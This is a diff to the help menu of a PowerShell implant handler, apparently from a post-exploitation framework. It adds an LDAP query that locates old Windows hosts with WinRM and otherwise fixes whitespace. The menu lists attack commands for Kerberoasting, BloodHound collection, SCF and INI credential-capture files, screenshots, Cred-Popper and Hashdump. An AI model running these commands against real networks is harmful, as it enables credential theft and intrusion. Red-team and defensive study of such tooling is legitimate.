@@ -182,6 +182,7 @@ function Implant-Handler
         write-host " Get-BloodHoundData -CollectionMethod 'Stealth' | Export-BloodHoundCSV" -ForegroundColor Green
         write-host " Get-BloodHoundData | Export-BloodHoundCSV" -ForegroundColor Green
         write-host " Invoke-Kerberoast -OutputFormat HashCat|Select-Object -ExpandProperty hash" -ForegroundColor Green
+        write-host " Get-DomainComputer -LDAPFilter `"(|(operatingsystem=*7*)(operatingsystem=*2008*))`" -SPN `"wsman*`" -Properties dnshostname,serviceprincipalname,operatingsystem,distinguishedname | fl" -ForegroundColor Green
         write-host " Write-SCFFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host " Write-INIFile -IPaddress 127.0.0.1 -Location \\localhost\c$\temp\" -ForegroundColor Green
         write-host ' Get-NetGroup | Select-String -pattern "Internet" ' -ForegroundColor Green
@@ -227,8 +228,8 @@ function Implant-Handler
         write-host `n "Useful Modules: " -ForegroundColor Green
         write-host "====================" -ForegroundColor Red
         write-host " Show-ServerInfo" -ForegroundColor Green 
-        write-host " Get-Screenshot" -ForegroundColor Green 
-        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green 
+        write-host " Get-Screenshot" -ForegroundColor Green
+        write-host " Get-ScreenshotMulti -Timedelay 120 -Quantity 30" -ForegroundColor Green
         write-host " Get-RecentFiles" -ForegroundColor Green
         write-host " Cred-Popper" -ForegroundColor Green 
         write-host " Hashdump" -ForegroundColor Green 
